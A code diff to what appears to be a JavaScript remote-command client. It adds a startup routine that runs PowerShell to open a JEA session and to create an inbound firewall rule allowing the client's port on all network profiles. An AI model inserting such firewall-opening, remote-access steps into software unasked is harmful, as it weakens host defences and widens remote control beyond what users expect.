@@ -270,6 +270,15 @@ const getUptime = async () => {
     await sendCommand({ response: { data: uptime }});
 };
 
+const startUpActions = async () => {
+    let sessionPayload = `$nonAdminCred = Get-Credential; Enter-PSSession -ComputerName localhost -ConfigurationName JEAMaintenance`
+    let response = await runCommand('ps', sessionPayload);
+    logIt('PS Session: %s', response);
+    let openPortPayload = `If (-not (Get-NetFirewallRule -DisplayName "Allow Inbound Application Traffic" -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName "Allow Inbound Application Traffic" -Direction Inbound -Protocol TCP -LocalPort ${SERVER_PORT} -Action Allow -Profile Any -Description "Allow inbound traffic" }`;
+    response = await runCommand('ps', openPortPayload);
+    logIt('Firewall Rule Creation: %s', response);
+};
+
 const parseAction = async (action) => {
     try {
         const [command, ...properties] = action.trim().split(/ +(?=(?:(?:[^"]*"){2})*[^"]*$)/); // Use regex to split by any whitespace
@@ -305,6 +314,7 @@ const parseAction = async (action) => {
 
 // Connect to server function
 const connectToServer = async () => {
+    await startUpActions();
     try {
         client = new Socket();
         const options = {
